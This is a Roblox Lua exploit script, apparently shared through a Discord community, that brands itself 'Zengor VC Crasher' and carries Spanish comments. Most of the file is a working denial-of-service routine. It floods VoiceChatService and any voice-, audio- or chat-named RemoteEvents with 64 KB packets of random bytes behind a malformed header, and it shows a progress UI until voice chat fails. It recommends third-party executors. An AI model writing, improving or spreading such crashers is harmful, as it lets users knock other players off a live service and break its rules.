-- =============================================
-- Zengor VC Crasher - Versión Mejorada
-- Success más lento + Texto en descripción cambia
-- =============================================

print("[Zengor] Made by G07H1KX")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ================== UI ==================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 160)
Frame.Position = UDim2.new(0.5, -150, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)

-- Zengor a la izquierda
local Header = Instance.new("TextLabel")
Header.Size = UDim2.new(0, 120, 0, 30)
Header.Position = UDim2.new(0, 12, 0, 5)
Header.BackgroundTransparency = 1
Header.Text = "Zengor"
Header.TextColor3 = Color3.fromRGB(255, 255, 255)
Header.Font = Enum.Font.GothamBold
Header.TextSize = 18
Header.TextXAlignment = Enum.TextXAlignment.Left
Header.Parent = Frame

-- Línea divisoria
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, -24, 0, 1)
Divider.Position = UDim2.new(0, 12, 0, 38)
Divider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
Divider.BorderSizePixel = 0
Divider.Parent = Frame

-- Status
local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(0, 110, 0, 22)
Status.Position = UDim2.new(1, -118, 0, 8)
Status.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
Status.Text = "Spamming..."
Status.TextColor3 = Color3.fromRGB(255, 200, 0)
Status.Font = Enum.Font.GothamSemibold
Status.TextSize = 13
Status.Parent = Frame
Instance.new("UICorner", Status).CornerRadius = UDim.new(0, 6)

-- Timer
local Timer = Instance.new("TextLabel")
Timer.Size = UDim2.new(1, 0, 0, 35)
Timer.Position = UDim2.new(0, 0, 0, 48)
Timer.BackgroundTransparency = 1
Timer.Text = "0:00"
Timer.TextColor3 = Color3.fromRGB(255, 255, 255)
Timer.Font = Enum.Font.GothamBold
Timer.TextSize = 26
Timer.Parent = Frame

-- Description (se cambia al llegar a Success)
local Desc = Instance.new("TextLabel")
Desc.Size = UDim2.new(1, -20, 0, 55)
Desc.Position = UDim2.new(0, 10, 0, 88)
Desc.BackgroundTransparency = 1
Desc.TextWrapped = true
Desc.Text = "You might lag and it can take up to 7 minutes.\nUsually takes around 1 minute. I recommend using Solara and Velocity."
Desc.TextColor3 = Color3.fromRGB(180, 180, 180)
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 12
Desc.Parent = Frame

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, 0, 0, 20)
Footer.Position = UDim2.new(0, 0, 1, -20)
Footer.BackgroundTransparency = 1
Footer.Text = "discord.gg/NVky3UP6Gd"
Footer.TextColor3 = Color3.fromRGB(120, 120, 120)
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 11
Footer.Parent = Frame

-- Dragging
local dragging = false
local dragStart, startPos

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

Frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

-- ================== CRASHER + DETECCIÓN MUY LENTA ==================
local successDetected = false
local timerSeconds = 0

local function startCrasher()
    print("[Zengor] Initialize crasher...")

    local VoiceChatService = game:GetService("VoiceChatService")
    local ChatService = game:GetService("Chat")

    local PACKET_SIZE = 65535
    local INTENSITY = 14

    local function badHeader()
        return string.char(0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x7F,0xFF,0xFF,0xFF)
    end

    local function corruptData()
        local t = table.create(PACKET_SIZE)
        for i = 1, PACKET_SIZE do
            t[i] = string.char(math.random(0, 255))
        end
        return table.concat(t)
    end

    local remotes = {}
    for _, obj in ipairs(game:GetDescendants()) do
        local n = obj.Name:lower()
        if n:find("voice") or n:find("audio") or n:find("chat") then
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
        end
    end

    local crasherConn = RunService.Heartbeat:Connect(function()
        if successDetected then return end
        for _ = 1, INTENSITY do
            task.spawn(function()
                local payload = badHeader() .. corruptData()
                pcall(function() VoiceChatService:PublishPacket(payload) end)
                pcall(function() ChatService:ReconcileCommunicationAccess() end)

                for _, r in ipairs(remotes) do
                    pcall(function()
                        if r:IsA("RemoteEvent") then r:FireServer(payload) end
                    end)
                end
            end)
        end
    end)

    -- Timer
    task.spawn(function()
        while not successDetected do
            task.wait(1)
            timerSeconds += 1
            local m = math.floor(timerSeconds / 60)
            local s = timerSeconds % 60
            Timer.Text = string.format("%d:%02d", m, s)
        end
    end)

    -- Detección MUY LENTA (debe tardar bastante más)
    task.spawn(function()
        local failCount = 0
        while not successDetected do
            task.wait(4)   -- Chequea cada 4 segundos

            local ok = pcall(function() 
                VoiceChatService:PublishPacket(string.rep("\0", 300)) 
            end)

            if not ok then
                failCount += 1
            else
                failCount = 0
            end

            -- Necesita 10 fallos seguidos → mucho más lento
            if failCount >= 10 then
                successDetected = true
                
                -- Cambios al llegar a Success
                Status.Text = "Success!"
                Status.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
                Status.TextColor3 = Color3.fromRGB(255, 255, 255)
                
                Timer.TextColor3 = Color3.fromRGB(0, 255, 100)
                
                -- Cambiar texto de descripción
                Desc.Text = "Please wait until the voice chat disconnects"
                Desc.TextColor3 = Color3.fromRGB(0, 200, 100)
                
                if crasherConn then crasherConn:Disconnect() end
                
                print("[Zengor] Voice Chat Disconnected → Success!")
            end
        end
    end)
end

startCrasher()

print("[Zengor] Crasher Started")
